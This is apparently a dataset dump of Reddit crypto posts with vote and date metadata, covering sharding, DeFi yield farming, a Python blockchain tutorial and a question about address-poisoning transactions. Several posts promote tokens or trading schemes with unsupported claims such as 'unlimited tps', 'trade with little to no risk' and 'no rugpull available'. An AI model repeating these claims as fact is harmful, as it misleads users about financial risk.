when you increase the amount of shards/chains, here’s where graph theory saves the day. the number of hops is called the diameter of the graph. and the number of edges each node has is called the degree. this is a well-known problem in graph theory called the degree diameter problem, that you can connect all chains together via the shortest path. that is what kadena uses to scale proof of work to solve the second problem, the hash braiding gives us the merkle tree structure needed to do cross-chain spv proofs, yielding a single currency across both chains. the coin (or any coin for that matter) is also just a smart contract, this means you can use the same method to do 100% safe cross chain operations. # what benefits does this give us? **scalability** literally unlimited tps, not just 10k or 100k or 1m **security** now since every chain is braided together you have absolutely unparalleled security, doing a 51% attack requires reproducing history up to the common confirmation depth. for kadena, doing an attack at the very moderate depth of 4 (on average 2 minutes), already requires overcoming all honest hash power on all chains. **speed** each chain/shard has a 30s blocktime, but there are 20 chains \[currently\] running in parallel, so the network blocktime is 1.5sec (if your dapp is scaled across all chains). once scaled to, say, 50 chains, the blocktime will drop to sub-second blocktime and a 1000 network would have a blocktime crossnetwork of 0.03 sec --- # personal opinion your first thought should be ""wait this is working right now? why is no one talking about this?"" it's because there's 5+ years of nonsense to deprogram, specifically *""pos is the only future""* and we're up against a lot of influencers and ""thought leaders"" that have large vested interests in pos being the only future (despite kda being evidence to the contrary). so it's gonna take time, because most of the biggest names have a lot to lose by even crediting kda with shipping sharding. crypto should reconsider the *narrative* that they've been fed for the last 5 years. specifically, that pow is outdated and pos is the only future. kda is pow and yet it alone has actually shipped a real sharded protocol. once people get with the idea that *pow works, and kda fixes its limitations* then we'll see rapid uptake. until then, i expect a lot of eth2.0 is the future and vitalik (who always fails to ship) is the prophet nonsense industrial-strength scalability can't be faked. only kadena can scale to any load, any sharded pos system will grind to a halt with enough shards and experience massive security breaches. layer-1 scaling is a monumental advancement in crypto that will dramatically increase the capacity for the sector to grow... but it may be that crypto is basically full of crap and doesn't actually need scaling because it'll always be *just hype*. i don't believe it's just hype, i believe crypto is the start of something truly massive and global in scope... but i could be wrong.",53,44,0.87,2021-08-16 18:20:27,web3,CryptoTechnology,VC420,False,58.099999999999994

Is blockchain tech already everything we need it to be?,"a recent post asked a question similar to 'am i going insane or is there no value in blockchain tech'. i have been thinking more about the idea that perhaps blockchain tech has reached maturity, and that we are instead waiting on the remainder of 'web3' to mature. i may be oversimplifying, but if i look at web3 as the existing internet, but without central intermediaries; then most applications can be built this way today. if we want a clubhouse, or zoom clone, these could be built atop existing webrtc infrastructure. a whatsapp clone can be built atop libp2p messaging (again i oversimplify). from the internet infrastructure view, the part that was missing has always been mechanisms of identity, ownership, and payment (trust mechanics in general). today, blockchains handle these in a variety of formats, such that a project can just pick the chain that fits best with the application architecture. in 'web 2.0', if i want auth, payments, file storage, etc - i would simply stitch together one or more infrastructure providers such as aws. this feels very natural today. is it possible that blockchain has already reached maturity for the value it brings to the decentralized web? are there any popular applications today that could not be built peer-2-peer in this context? the big gap i still see in this view is who pays for services that are free in web 2.0 (such as facebook). but even in this case, blockchains provide a variety of incentive mechanics where increasing usage could appreciate a digital token, which in turn gives incentive for people to run the underlying infrastructures. i also feel crazy in that there seems to be consensus that blockchain is suppose to do everything, or should be doing more than it does. in all of this, i am viewing the problem space from the domain of infrastructure, agnostic of application. is blockchain tech already everything we need it to be?",48,51,0.87,2022-04-27 05:41:12,web3,CryptoTechnology,techphyre,True,57.900000000000006

POWH and the danger of bugs in smart contracts,"so as you may or may not know this week someone launched a litteral ponzi scheme in a smart contract called powh. this being totally dumb, it of course took off. today someone misused an overflow bug to drain the wallet of all of its funds. this got me started thinking; how do we protect legitimate contracts from this and isn't it time to use languages that have things like overflow protection build in? for more info see: https://www.reddit.com/r/powhcoin/comments/7ugtxf/what_happened_next_step_forwards/?utm_source=reddit-android",59,32,0.95,2018-02-01 03:30:00,web3,CryptoTechnology,Nictel,False,57.7
What's the most important use case for Web3?,"web3 as commonly known refers to the third generation of the internet, which is focused on decentralization. there are several uses of web3 which includes: 1. decentralized finance (defi): web3 is being used to develop decentralized finance applications that offer financial services without the need for intermediaries like banks. all defi projects belong here. 2. non-fungible tokens (nfts): web3 is enabling the creation and trading of third generation nfts, i.e. composable nfts. an example of a project doing this is fusion by metaplex. 3. decentralized autonomous organizations (daos): web3 is facilitating the creation of daos, which are organizations that are run by code and governed by their members. this enables decentralized decision-making and eliminates the need for traditional corporate structures. e.g. makerdao, phoenixdao etc. 4. crypto payment: the existence of web3 tech now made it possible for payments on blockchain to include nfts and metaverse assets among the list of options (in addition to cryptocurrencies) to redeem payment. cryptmi is a project that belongs here. i see this as the most important use for web3, cus bill payment cuts across the daily life of human beings. 5. identity and data management: web3 is being used to create decentralized identity solutions that give users more control over their personal data and privacy. see everestid. would like to know your take on the use cases for web3 tech and which one you think is the most pivotal.",52,43,0.93,2023-04-12 00:32:58,web3,web3,yesifebewr,False,57.7

Staked Services,"this sub felt like a decent place to gather feedback on a concept i call staked services. please note that i am exceptionally new to the *technical* side of blockchain and cryptocurrency technologies. i am posting here to see how many holes can be poked in this idea (so fire away). also, i did not flair this as oc as i would not be surprised at all to hear something like this has been thought of and talked about before. if you have any resources that pre-date this, please link them to me. i plan to use this concept in the future, so if someone has refined this concept already, then i don't want to waste any more time reinventing the wheel. # staked services elevator pitch: deposit-based subscription services, powered by smart contracts and staking-based (pos, dpos, etc) cryptocurrencies. # brief example a video streaming company wants to expand their subscription options. they offer a “staked” subscription tier: a subscriber deposits a stake-able currency into a staked services smart contract (the contract requires x amount of the cryptocurrency to be locked in). so long as the subscriber does not terminate the smart contract, they will have access to the company’s video streaming services. note: the company does not actually have access to the deposit, but **does** receive the staking rewards from the deposit. the user can cancel at any time to retrieve their **full deposit**, but will be subject to a predefined “lockout” period where they must wait for their deposit to be returned (as a disincentive for malicious behavior). # concrete end-to-end example actors: * john, a video content consumer * netflix, a video streaming provider wallets: * john’s wallet: 400+ xyz * netflix wallet * “staked services” smart contract escrow wallet (independent of both parties) netflix begins offering a “staked services” subscription tier. the contract is defined as follows: * user must deposit 400 xyz * user may cancel the contract at any time, but: * deposited xyz is subject to a 30-day cancellation lock-up period * user may stream video content as soon as the smart contract reaches the appropriate state (namely, the 400 xyz is successfully placed in the “staked services” cryptocurrency wallet) * staking rewards are earned in the smart contract cryptocurrency wallet, **not in john’s wallet** * smart contract regularly pays out staking rewards to netflix’s cryptocurrency wallet john finds out about netflix’s “staked services” subscription tier, and decides to subscribe via this method: 1. john visits the netflix website 2. john connects his wallet (some web3-enabled wallet) 3. in most cases (for content providers today), john would probably need to associate his account with his wallet (associate john’s public key with his email-based netflix account) 4. john executes the “staked services” smart contract, which deposits his 400 xyz 5. **john pays all smart contract execution fees** 6. after verification, john can now watch netflix video content 7. john can authenticate via his regular account or via the wallet (digitally signing to verify his identity, which costs nothing) later, john is no longer interested in the content on netflix, and wishes to unsubscribe: 1. john visits the netflix website 2. john connects his wallet (some web3-enabled wallet) 3. john starts the cancellation process for his “staked services” contract 4. the 30-day lock-out period is started 5. after 30 days: the full 400 xyz deposit is returned to john’s wallet 6. netflix disables john’s access to video content # use cases any web-connected service provider could leverage this payment system. some examples: * video streaming services * vpn providers * software license subscriptions * membership passes # incentives and drawbacks incentives for the consumer * fixed deposit for a “lifetime” of service * easy to cancel * **full deposit is returned** incentives for the provider * consistent income (via collection of staking rewards) * offers an additional payment option (another avenue for customer acquisition) * can define the smart contract closing period (1 day, 1 week, 1 month, etc) incentives for both parties * transparency * security * fair warning cancellation for either party (definable smart contract closing period) # drawbacks + solutions **potentially high upfront deposit cost for consumer** * consider: from the previous example, let’s say netflix charges $10 a month for service, the xyz cryptocurrency is worth $5, and xyz stakes at 6% * a subscriber would need to **deposit $2000 worth of xyz** to initiate the contract; the average consumer may be off-put by this initial deposit cost (despite it being fully refundable) * mitigation: allow for a deposit plan (split up the deposit into multiple smaller payments) * an auto-cancellation mechanism would be required if the deposit payments are not made on time * this split-payment deposit plan starts to sound like ""yet another subscription"", but keep in mind that this plan has a finite number of payments and is refunded to the subscriber after they cancel **“staked services” smart contract escrow wallet anonymization / security** * an escrow wallet would be required with staked services to ensure a trustless transactions * the initial creation of the escrow wallet (for each eligible blockchain platform) would present ownership / security concerns * mitigation: not heavily researched on this subject, but possibly multi-signature keys? * overall goal is to “set and forget” a private key for each blockchain platform so that the escrowed funds can’t be stolen **blockchain / protocol changes that alter/remove staking** * consider: a cryptocurrency changes its consensus mechanism, moving away from pos * mitigation: the staked services smart contracts can be canceled and different cryptocurrency that supports pos and smart contracts can be selected **consumer or provider can “pull the rug” with cancellation** * mitigation: set an appropriate the smart contract closing period that is agreed upon by both parties **centralization concerns** * consider: multiple large corporations/conglomerates could collect a significant staking position in a given cryptocurrency (**this is exceptionally unlikely, but might be a consideration for smaller cap cryptocurrencies?**) * mitigation: escrow account mitigates this entirely; nobody owns the escrow account **cryptocurrency price volatility / inflation concerns** * consider: a staking cryptocurrency heavily used by a provider loses a significant amount of its value * mitigation: not many options here, perhaps smart contract-based insurance? price fluctuations ideally aren’t a concern long-term **contract amendments** * a by-product of inflation concerns (above) * consider: company wants to adjust the deposit requirement (likely to increase it to compensate for inflation) * mitigation: smart contracts are immutable (typically) * note: a company can decide to amend future contracts, if they wish **dpos delegate concerns** * choosing a delegate (how will this be selected?) * ensuring a delegate maintains good behavior and desired reward distribution * mitigation: allow the business to choose the delegate and update at any time (this is transparent and irrelevant to the subscriber in the contract) if someone has managed to actually trudge through all this, i appreciate your time. let me know what you think and how to improve on this concept (or if it's utter trash and will clearly never be used). tl;dr: a cryptocurrency deposit-based subscription model. do you see a future for this or is it too cost-prohibitive on the consumer side (even with the concept of a full return of deposit)?",62,24,1.0,2021-05-12 15:11:43,web3,CryptoTechnology,MercenaryIII,False,56.8
China's Surprising Role in Blockchain Adoption,"it may sound surprising, but china seems to be spearheading adoption of blockchain technology! here's what they're doing: first, facilitate cross border transactions making digital payments more secure. 38 banks are conducting pilot experiments on different ways they can use blockchain to make cashflow more secure. second, they are treating blockchain tech as a key pillar in smart city infrastructures. they’re encrypting and storing massive amounts of data generated by sensors that tackles issues with: * road network management * public health * energy generation * communication efficiency * food safety * pollution reduction third, immutability of the blockchain is being leveraged for policing. the ability to verify and preserve electronic evidence ensures information can’t be tampered with by hackers. fourth, guarantee key official updates are properly announced. blockchain-based platforms were used to send out daily safety updates during the covid pandemic lockdown! fifth, management and rewarding of human resources. a pilot experiment allows soldiers to exchange tokens earned during service for rewards later on. other than giving blockchain technology real use cases, the government is supporting the deployment for dapps through their blockchain-based service network (bsn). to bolster innovation, bsn makes it cheap and easy to deploy multi-chain dapps without having to install a bunch of servers to bridge blockchains. the chain runs on non tradable tokens (ntt), which is advantageous compared to traditional cryptocurrency tokens by removing the volatility of prices, by fixing costs. it costs around $0.03 to mint a standard nft on bsn! with the government also being [pushed to reconsider its crypto ban](https://cointelegraph.com/news/bank-of-china-ex-advisor-calls-beijing-to-reconsider-crypto-ban), they seem to be poised in leading the adoption of blockchain technology. the only question left is what other non-governmental projects will rise to tackle this same challenge? let me know what you think",50,44,0.91,2023-02-02 09:16:24,web3,CryptoTechnology,spepaycakoy,False,56.7
"""Don't Buy - Farm It!"" Protocol called Dracula and it's ""victims""","#defi #yeildfarming #farming don't buy - farm it! #defi #yieldfarming #farm #farming farm them all what is yield farming? i’m sure that you have heard about farming the $uni token. by providing liquidity to one of the four pools (although you can also to all four), you receive $uni tokens as a reward. very simple idea. some people decide to keep these tokens, but many people immediately sell these tokens for a different asset. the goal is to increase the body of its main assets. but there are several nuances: low rewards and high gas prices for transactions and swaps. these factors make it unprofitable if you do not have a large amount of capital in the pool. therefore, whales are the only people who are engaged in this, selling their tokens and thereby pushing the price of the reward ($uni) down. ordinary users watch how the price of their reward is constantly falling (take $sushi, for example). that’s where dracula comes in. dracula protocol aggregates on its smart contracts deposited by users lp tokens (tokens that you get for providing liquidity in @uniswap, @sushiswap, @pickle, @luaswap, @breederdodo) and starts to earn rewards of these victim pools. with the help of “drain” function, activated by users, it collects these rewards and sells them on the market, than uses the received ethereum to buy dracula protocol ($drc) tokens (thus supporting drc price), and then burns a portion of these tokens (deflation mechanism), while also distributing $drc as reward to liquidity providers in his protocol. now let's talk about the advantages (without going into technical details) of dracula over its victims. in pools like uniswap or sushi, the more money locked in the pools, the more your share is diluted and the less rewards you get. dracula, on the contrary, works in the exact opposite way; the more locked in its pools, the more rewards its receives, which translates to more $eth being received which goes in to directly buy $drc and reward its token holders. at the same time, a portion of these tokens are burned, reducing the total supply. this is how @draculaprotocol creates deflation. it sounds a bit complicated, but main idea is that more tlv locked -> more rewards selling -> more drc buybacks - more burning - win win situation. you don't have to sell rewards tokens yourself, you don't buy your main assets, you don't need to lock them in pools. you save a lot of gas by not having to claim or swap tokens, or adding liquidity to pools. instead, you get an asset that should grow in value while the total supply of the asset is constantly decreasing. this all depends on dracula protocol being able to attract enough tlv in its victims pools. dracula protocol already has 5 kinds of protocols as a victims : #uniswap, #sushiswap, #pickle, #luaswap, and #dodo. dracula protocol is also working on adding new protocols as victims. you can farm $drc by staking pairs such as: * $wbtc-$eth * $usdt-$eth * $dai-$eth * $usdc-$eth * $omg-$eth * $link-$eth * $yfi-$eth * $snx-$eth * $aave-$eth * $ren-$eth * $wbtc-$tbtc and more other pairs and also by providing only one asset at dodo like eth link snx comp wbtc yfi usdc, and all stablecoins using @curvefinance through pickle. don't buy dracula - just farm it!!! p.s. audit -done- [https://twitter.com/valentinmihov/status/1317120493577768960](https://twitter.com/valentinmihov/status/1317120493577768960) no rugpull available -done- liqudity provided by community",69,14,0.97,2020-12-19 16:22:12,web3,defi,captainpicard42,False,56.7

LOT deserves a chance due to their attitude to trading,"trade with little to no risk. you're probably wondering how. you may wonder if there is a magic way or a coin. no, we cannot anticipate market movement with 100% accuracy. however, practically every trader has their own approach for diversifying risks and conserving cash. i will not promote this strategy to you, but i will tell you about it while it is still feasible. lot trade began about a year ago. they hold free entry contests on a regular and private basis. the most intriguing aspect is that persons who did not even take a spot might still receive their prize of 50-100 dollars for simply participating in an activity. that involves striking a single deal! i'm not sure how long they'll continue to share money with everyone, but they claim they're not out of money. i wouldn't have written about it if i hadn't tested it myself. another intriguing aspect about them is the recent release of a limited nft series. these are quite handy and will not disappear: staking them will allow you to recoup half of your investment within a year and earn a portion of prize pools as a partner even if you do not participate in tournaments. i recently purchased the lowest nft for $70. isn't it not a small amount of money to put at risk?",71,17,0.65,2022-02-25 10:33:54,web3,defi,DreamilyAnnoying,False,55.900000000000006

object-oriented concepts of the python programming language). here is the basic blueprint of the blockchain algorithm for creating the fcccoin: >class block: def \_\_init\_\_(): \#first block class pass def calculate\_hash(): \#calculates the cryptographic hash of every block class blockchain: def \_\_init\_\_(self): \# constructor method pass def construct\_genesis(self): \# constructs the initial block pass def construct\_block(self, proof\_no, prev\_hash): \# constructs a new block and adds it to the chain pass u/staticmethod def check\_validity(): \# checks whether the blockchain is valid pass def new\_data(self, sender, recipient, quantity): \# adds a new transaction to the data of the transactions pass u/staticmethod def construct\_proof\_of\_work(prev\_proof): \# protects the blockchain from attack pass u/property def last\_block(self): \# returns the last block in the chain return self.chain\[-1\] **now, let me explain what is taking place…** **1. building the first block class** a blockchain comprises of several blocks that are joined to each other (that sounds familiar, right?). the chaining of blocks takes place such that if one block is tampered with, the rest of the chain becomes invalid. in applying the above concept, i created the following initial block class >import hashlib import time class block: def \_\_init\_\_(self, index, proof\_no, prev\_hash, data, timestamp=none): self.index = index self.proof\_no = proof\_no self.prev\_hash = prev\_hash self.data = data self.timestamp = timestamp or time.time() u/property def calculate\_hash(self): block\_of\_string = “{}{}{}{}{}”.format(self.index, self.proof\_no, self.prev\_hash, self.data, self.timestamp) return hashlib.sha256(block\_of\_string.encode()).hexdigest() def \_\_repr\_\_(self): return “{} – {} – {} – {} – {}”.format(self.index, self.proof\_no, self.prev\_hash, self.data, self.timestamp) as you can see from the code above, i defined the \_\_init\_\_() function, which will be executed when the block class is being initiated, just like in any other python class. i provided the following parameters to the initiation function: self—this refers to the instance of the block class, making it possible to access the methods and attributes associated with the class; index—this keeps track of the position of the block within the blockchain; proof\_no—this is the number produced during the creation of a new block (called mining); prev\_hash—this refers to the hash of the previous block within the chain; data—this gives a record of all transactions completed, such as the quantity bought; timestamp—this places a timestamp for the transactions. the second method in the class, calculate\_hash, will generate the hash of the blocks using the above values. the sha-256 module is imported into the project to assist in obtaining the hashes of the blocks. after the values have been inputted into the cryptographic hash algorithm, the function will return a 256-bit string representing the contents of the block. this is how security is achieved in blockchains—every block will have a hash and that hash will rely on the hash of the previous block. as such, if someone tries to compromise any block in the chain, the other blocks will have invalid hashes, leading to disruption of the entire blockchain network. ultimately, a block will look like this: >{ “index”: 2, “proof”: 21, “prev\_hash”: “6e27587e8a27d6fe376d4fd9b4edc96c8890346579e5cbf558252b24a8257823”, “transactions”: \[ {‘sender’: ‘0’, ‘recipient’: ‘quincy larson’, ‘quantity’: 1} \], “timestamp”: 1521646442.4096143 } **2. building the blockchain class** the main idea of a blockchain, just as the name implies, involves “chaining” several blocks to one another. therefore, i’m going to construct a blockchain class that will be useful in managing the workings of the whole chain. this is where most of the action is going to take place. the blockchain class will have various helper methods for completing various tasks in the blockchain. let me explain the role of each of the methods in the class. a. constructor method this method ensures the blockchain is instantiated. >class blockchain: def \_\_init\_\_(self): self.chain = \[\] self.current\_data = \[\] self.nodes = set() self.construct\_genesis() **here are the roles of its attributes:** * self.chain—this variable keeps all blocks; * self.current\_data—this variable keeps all the completed transactions in the block; * self.construct\_genesis()—this method will take care of constructing the initial block. **b. constructing the genesis block** the blockchain requires a construct\_genesis method to build the initial block in the chain. in the blockchain convention, this block is special because it symbolizes the start of the blockchain. in this case, let’s construct it by simply passing some default values to the construct\_block method. i gave both proof\_no and prev\_hash a value of zero, although you can provide any value you want. >def construct\_genesis(self): self.construct\_block(proof\_no=0, prev\_hash=0) def construct\_block(self, proof\_no, prev\_hash): block = block( index=len(self.chain), proof\_no=proof\_no, prev\_hash=prev\_hash, data=self.current\_data) self.current\_data = \[\] self.chain.append(block) return block **c. constructing new blocks** the construct\_block method is used for creating new blocks in the blockchain. here is what is taking place with the various attributes of this method: * index—this represents the length of the blockchain; * proof\_nor & prev\_hash—the caller method passes them; data—this contains a record of all the transactions that are not included in any block on the node; * self.current\_data—this is used to reset the transaction list on the node. if a block has been constructed and the transactions allocated to it, the list is reset to ensure that future transactions are added into this list. and, this process will take place continuously; * self.chain.append()—this method joins newly constructed blocks to the chain; return—lastly, a constructed block object is returned. **d. checking validity** the check\_validity method is important in assessing the integrity of the blockchain and ensuring anomalies are absent. as mentioned earlier, hashes are essential for the security of the blockchain as even the slightest change in the object will lead to the generation of a completely new hash. therefore, this check\_validity method uses if statements to check whether the hash of every block is correct. it also verifies if every block points to the right previous block, through comparing the value of their hashes. if everything is correct, it returns true; otherwise, it returns false. >u/staticmethod def check\_validity(block, prev\_block): if prev\_block.index + 1 != block.index: return false elif prev\_block.calculate\_hash != block.prev\_hash: return false elif not blockchain.verifying\_proof(block.proof\_no, prev\_block.proof\_no): return false elif block.timestamp <= prev\_block.timestamp: return false return true **e. adding data of transactions** the new\_data method is used for adding the data of transactions to a block. it’s a very simple method: it accepts three parameters (sender’s details, receiver’s details, and quantity) and append the transaction data to self.current\_data list. anytime a new block is created, this list is allocated to that block and reset once more as explained in the construct\_block method. once the transaction data has been added to the list, the index of the next block to be created is returned. this index is calculated by adding 1 to the index of the current block (which is the last in the blockchain). the data will assist a user in submitting the transaction in future. >def new\_data(self, sender, recipient, quantity): self.current\_data.append({ ‘sender’: sender, ‘recipient’: recipient, ‘quantity’: quantity }) return true **f. adding proof of work** [proof of work](https://en.bitcoin.it/wiki/proof_of_work) is a concept that prevents the blockchain from abuse. simply, its objective is to identify a number that solves a problem after a certain amount of computing work is done. if the difficulty level of identifying the number is high, it discourages spamming and tampering with the blockchain. in this case, we’ll use a simple algorithm that discourages people from mining blocks or creating blocks easily. >u/staticmethod def proof\_of\_work(last\_proof): ”’this simple algorithm identifies a number f’ such that hash(ff’) contain 4 leading zeroes f is the previous f’ f’ is the new proof ”’ proof\_no = 0 while blockchain.verifying\_proof(proof\_no, last\_proof) is false: proof\_no += 1 return proof\_no u/staticmethod def verifying\_proof(last\_proof, proof): \#verifying the proof: does hash(last\_proof, proof) contain 4 leading zeroes? guess = f'{last\_proof}{proof}’.encode() guess\_hash = hashlib.sha256(guess).hexdigest() return guess\_hash\[:4\] == “0000” **g. getting the last block** lastly, the latest\_block method is a helper method that assists in obtaining the last block in the blockchain. remember that the last block is actually the current block in the chain. >u/property def latest\_block(self): return self.chain\[-1\] **let’s sum everything together** here is the entire code for creating the fcccoin cryptocurrency. you can also get the code on this[ github repository.](https://github.com/alfrick/create-cryptocurrency-in-python) >import hashlib import time class block: def \_\_init\_\_(self, index, proof\_no, prev\_hash, data, timestamp=none): self.index

**conclusion** there you have it! that’s how you could create your own blockchain using python. let me say that this tutorial just demonstrates the basic concepts for getting your feet wet in the innovative blockchain technology. if this coin were deployed as-is, it could not meet the present market demands for a stable, secure, and easy-to-use cryptocurrency. therefore, it can still be improved by adding additional features to enhance its capabilities for mining and sending financial transactions. nonetheless, it’s a good starting point if you decide to make your name known in the amazing world of cryptos. if you have any comments or questions, please post them below. happy (crypto) coding!

Weird transactions mirroring my USDT transactions appearing on Etherscan... what is this?!,"to preserve my privacy i cannot share my address (please dm me if you really are interested in digging into this privately). but here's the situation: nothing is stolen. i use hardware wallets, so private keys are never exposed. for safety, i moved some stuff away to another wallet. but i still would like to understand wth is going on. some kind of scam attempt, social engineering?! every transaction i'm conducting on my address with usdt is mirrored with another transaction of the same amount with a token i don't know with the same name and an address with the first and last 4 letters equal to the destination address. **example**: say i sent usdt from my address to the address `0xdead123456beef`. a few minutes later, under my address's ""token transfers (erc-20)"" tab in etherscan, i see another transaction, with the same amount, of a token called ""erc20"" on the table, to some other address `0xdead666666beef`, and my address being under the ""from"" tab in the table. note also that i haven't paid fees for that transaction, so it's not even mine. the internals of that transaction are some routing that i don't understand. even when i click on that transaction, i see my address nowhere on etherscan!!! is this a bug in etherscan? or something scammers are trying to exploit? i'm no noob in this field. i'm a blockchain engineer (not on ethereum though). this freaked me out yesterday enough to move my funds to another address. but slowly i'm realizing it may be a nothing burger. what do you guys think?",47,44,0.85,2024-01-10 05:31:26,web3,ethereum,TheQuantumPhysicist,False,54.3

Emergent centralization due to economies of scale (PoW vs DPoS) – Colin LeMahieu,"first, the article: https://medium.com/@clemahieu/emergent-centralization-due-to-economies-of-scale-83cc85a7cbef colin is making an interesting argument that i don't think enough people are paying attention to. he seems to be saying that by offering strong incentives for decentralization (e.g. mining), you actually increase centralization because 1) it requires capital investment, and 2) because capitalism often leads to people building economies of scale to maximize profit. in nano though, there isn't a strong direct financial incentive for being a representative, so you don't have the same incentivized centralization pressure as pow mining. you basically only have enough incentive to keep the network running, which is exactly what you want to stay efficient and decentralized. in addition to that, colin is claiming that delegated proof-of-stake (dpos) is actually nano's strength, where a lot of new outsiders see it as a weakness. because everyone can redistribute their voting weight at any time, theoretical bad actors would simply be voted out with no pushback from massive miners. what do you think? is mining actually cryptocurrency's greatest centralization pressure? are indirect incentives enough to run a global cryptocurrency?",50,37,0.92,2018-10-31 08:31:00,web3,CryptoTechnology,Qwahzi,False,54.0

Can watching what other big investors own might be useful?,"hi, i’m tired of reading about bubbles, crashes, pump and dumps - i don’t invest in crypto to buy a lambo in 3 days (also because lambo is so 1995). i think that we can do better than that, like buy saab900. don't worry it's a joke, i own a bike. anyway, i know that there are a lot of tools and pages for traders with a massive amount of different charts, predictions and wishful-thinking-graphs. but there is also another group of people interested in crypto - investors, people who invest money slowly, they are choosing tokens and currencies thinking about fundamentals, what kind of team does it, do they think about legal part, analyse the technology included. investors search did the team already find a product-market-fit or do they just talking that they did or maybe are they just another scam? as far as i know, there are not many tools for investors. especially for investors who think that charts aren’t everything. i’m working with a team based in warsaw, where we’re trying to build a good tool for investors - not only for traders (but frankly speaking i can imagine traders using it), and i wanted to show you that - because some of you might find it interesting. you can check all the tokens on ethereum blockchain, but we described just around 600 of them (we took a list of tokens on etherdelta and researched them). one of the strategies i think might be helpful in investing in crypto is watching wise investors who are careful and slow in making decisions, and learning from them, observing - you know, the old-school way. in this tool i want to show you can see for example 10 top holders of a particular token, and also how much the other token holders have all together. you can check top holders’ other transactions, all their activities on the blockchain. so if an investor (or maybe trader?) is interested in looking for whales and they want to see what this particular investor has so they could buy same tokens. you will also find there all the links to the official social media created by the token creators and so on. so this tool is basically an interface to the ethereum blockchain - you can also search your account and check the list of your activities, the list of your tokens and what kind of transactions you have been making concerning this particular token. answering the question which you didn’t ask yet: yes, we know the etherscan, but also we know that it can be shown in a better way - i’m not saying that we did that, i’m saying that we’re searching for it. i want to show you this tool, but just please - don’t expect too much :) it's in a beta version, and it’s still in progress. any feedback and comments will be crucial for us. so if you would like to check for example zrx- 0x tokens you can do that here: http://trivial.co/t/0xe41d2489571d322189246dafa5ebde1f4699f498 (the number in the link is just a smart contract number of zrx - you can check it with any different token on ethereum blockchain). if you would like to check the balance or tokens of any address - you can do that here: http://trivial.co/profile/xxxxxxxxxx - where xxxxxxxxx is any account number. so basically it’s working like etherscan - we don’t collect any data, it’s always on users’ site. i never buy tokens just watching the charts - i always do research, trying to know the team, talk to them, check their social medias, reddit posts - i hope that our tool will also help me with getting some of the tokens better. i hope you will find it useful :) please tell me also if you will hate it - you know how it is with your own children - you don't always see all their weaknesses.",46,45,0.81,2018-01-18 07:08:12,web3,CryptoTechnology,Martyna_anytraM,False,53.699999999999996

StrongNode is the future of the Node Infrastructure-as-a-Service model. The next generation of edge networking leveraging blockchain.,"strongnode edge is a modern take on edge computing, changing the data center and cloud computing paradigm to help create an efficient and secure on-demand network. the technology alleviates inefficiencies by moving applications and data closer to the user. this is accomplished by decentralizing traditional data centers and locating them physically closer to end users, thus placing data and apps closer to the end-user edge. although there are other companies that have node-as-a-service business models and technology, nobody does it like strongnode edge. in the ongoing back and forth between centralized and decentralized it, we are beginning to see the limitations of a centralized it that relies on hundreds or thousands of servers running applications in either private data centers or public clouds. these data centers are often geographically far from the end user and the distance between the user and the apps, data, and services they interact with can create inefficiencies from an organizational, bandwidth, throughput, security, cost, availability, and reliability perspective. edge computing seeks to alleviate these inefficiencies by moving applications and data away from data centers towards the edge of the network and closer to the user, utilizing smart objects, mobile phones, network gateways, and other means to perform tasks and provide service on behalf of the cloud.\[1\] by moving services to ‘the edge,’ it is possible to provide content caching, service delivery, storage, and iot management resulting in better response times and transfer rates and helps alleviate the inefficiencies mentioned above. at the same time, distributing the logic in different network nodes introduces new issues and challenges. eight areas where traditional edge computing has issues and challenges: * security and accessibility * network bandwidth * distributing computing * latency * backup * data accumulation * control and management * scale taking on demand blockchain nodes as an example, strongnode edge is an alternative to self-running of full blockchain nodes; it offers developer tools and infrastructure to set up andmanage the nodes connected to the blockchain. strongnode edge offers apis for developers to create automated workflows. nodes can be spun up manually as needed or automatically load balanced for optimal reliability when needed most. in order to scale out and grow the strongnode edge network, it is important to bring value via different use cases for people who would want to join and contribute to the network. to achieve this, strongnode is creating an incubator for innovative companies and projects that help scale out the strongnode edge network and bring value to the ecosystem via infrastructure, products, and services. make sure to keep an eye on this promising project. the current problem in today's edge computing will be solved by the solution strongnode has to offer. it's a project that will keep making steps to get bigger and will have their own token. make sure to follow their twitter: strongnodeedge, to stay updated about their journey.",65,11,1.0,2021-10-04 11:55:30,web3,BlockchainStartups,kelvintan705,False,53.4

What are Your Thoughts on Governance in CryptoCurrencies?,"(some talking points at the bottom.) lately i have been really fascinated with how the question of governance is playing out in this field. i am talking about, for example, delegated proof of stake consensus models, in projects like ark and icon, and the movement from pow to pos in general. for people who aren't aware, it is something like a republic or indirect democracy, where you vote on representatives who then have a say in policies moving forward, or who earn profit by acting as validators on the network. but i wonder how these platforms will encourage voter participation in choosing these delagates, and foster fair ideals? i wonder how we will ensure good actors who value some more ephemeral things like decentralization and transparency which many crpyto enthusiasts hold dear, over pure profit motive or pure technical efficiency. it seems like all the difficulties and imperfections of governance we deal with today are arising in crypto land, and they may pose a threat to many people's ideologies of pure decentralization. a separate but related thought: how do people feel about so much power shifting to technologists? depending on the influence of these networks on our society, and depending on the influence of certain representatives on those networks, it seems like technologists will have an enormous power on people. we already see this in the global power of companies like facebook and google, where people even started to speculate that zuckerberg might run for president and solidify that influence on a governmental level. i wonder if crypto in so energetically exploring governance models might accelerate that future, for better or worse. honestly i am still wrapping my head around this and need to dive into it in more detail. but for the time being i thought i'd open a general discussion and see where it goes. so, i'll leave you with a few general questions if anyone would like to respond, or you could post your own thoughts/questions here. * do any details of governance systems on crypto platforms worry you? which governance models excite you and why? * how will crypto maintain strong community interaction necessary for governance models? * how do you see crypto changing our traditional governments in the short and long term? * how do you see crypto changing the way we interact with and view current governmental systems?",56,26,0.91,2018-01-11 21:11:03,web3,CryptoTechnology,bushwarblerslover,False,53.1

